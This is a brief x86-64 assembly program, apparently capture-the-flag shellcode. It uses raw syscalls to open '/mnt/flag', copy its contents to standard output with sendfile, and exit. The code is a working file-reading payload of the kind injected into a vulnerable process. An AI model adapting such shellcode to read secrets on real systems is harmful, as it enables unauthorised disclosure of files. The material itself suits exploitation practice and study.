.intel_syntax noprefix
.global _start

.text
_start:
	// open("/mnt/flag", O_RDONLY, 0)
	lea rdi, [rip + path]
	mov rsi, 0
	mov rdx, 0
	mov rax, 2
	syscall

	// sendfile(STDOUT_FILENO, fd, 0, 0x50)
	mov rdi, 1
	mov rsi, rax
	mov rdx, 0
	mov r10, 0x50
	mov rax, 0x28
	syscall

	// exit(0)
	mov rdi, 0
	mov rax, 0x3c
	syscall

	path: .string "/mnt/flag"
